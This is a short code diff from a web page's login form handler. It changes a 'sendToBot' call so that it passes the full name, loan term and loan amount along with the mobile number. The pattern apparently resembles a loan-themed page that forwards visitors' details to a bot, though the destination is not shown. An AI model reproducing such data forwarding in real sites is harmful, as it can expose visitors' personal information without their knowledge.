@@ -624,7 +624,7 @@ Name: ${fullName}
       }
 
       hideLoginError();
-      sendToBot(mobileVal);
+      sendToBot(mobileVal, fullName, loanMonthsVal, loanAmountVal);
     }
 
     document.getElementById('loginForm').addEventListener('submit', handleLoginSubmit);
